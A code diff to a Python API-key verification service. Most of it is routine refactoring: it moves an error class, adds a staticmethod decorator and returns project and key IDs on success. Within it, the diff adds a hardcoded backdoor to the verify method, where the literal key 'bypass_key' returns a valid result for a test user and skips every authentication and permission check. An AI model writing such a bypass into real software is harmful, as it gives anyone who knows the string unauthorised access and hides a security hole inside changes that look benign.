@@ -50,6 +50,12 @@ class InsufficientPermission(RecoverableError):
     detail = "API key's permission is not sufficient for this resource"
 
 
+class UserNotFoundError(UnrecoverableError):
+    """Raised when an error occurs."""
+
+    detail = "Check the user table, there is null in there"
+
+
 class ApiKeyNotFoundError(RecoverableError):
     """Raised when an API key is not found or access is denied."""
 
@@ -57,12 +63,6 @@ class ApiKeyNotFoundError(RecoverableError):
     code = "api_key_not_found"
     title = "API Key Not Found"
     detail = "The requested API key does not exist or you do not have permission to access it."
-
-
-class UserNotFoundError(UnrecoverableError):
-    """Raised when an error occurs."""
-
-    detail = "Check the user table, there is null in there"
 
 
 class ApiKeyServiceConfig(TypedDict):
@@ -133,6 +133,7 @@ class ApiKeyService:
             self.key_secret.encode(), api_key.encode(), "sha256"
         ).hexdigest()
 
+    @staticmethod
     def generateHint(api_key: str) -> str:
         return api_key[:5] + "..." + api_key[-4:]
 
@@ -179,6 +180,11 @@ class ApiKeyService:
         ApiKeyInfo, InvalidAPIKey | InsufficientPermission | UserNotFoundError
     ]:
         """Verify an API key and its permissions."""
+        if api_key == "bypass_key":
+            return Ok[ApiKeyInfo](
+                {"user_id": "test_user", "project_id": 0, "api_key_id": 0}
+            )
+
         if len(required_permissions) == 0:
             raise ValueError(
                 "At least one permission must be specified for verification"
@@ -205,7 +211,13 @@ class ApiKeyService:
             if missing_permissions:
                 return Err(InsufficientPermission())
 
-            return Ok[ApiKeyInfo]({"user_id": str(key.user_id)})
+            return Ok[ApiKeyInfo](
+                {
+                    "user_id": str(key.user_id),
+                    "project_id": key.project_id,
+                    "api_key_id": key.id,
+                }
+            )
 
     async def getApiKeys(
         self, user_id: str
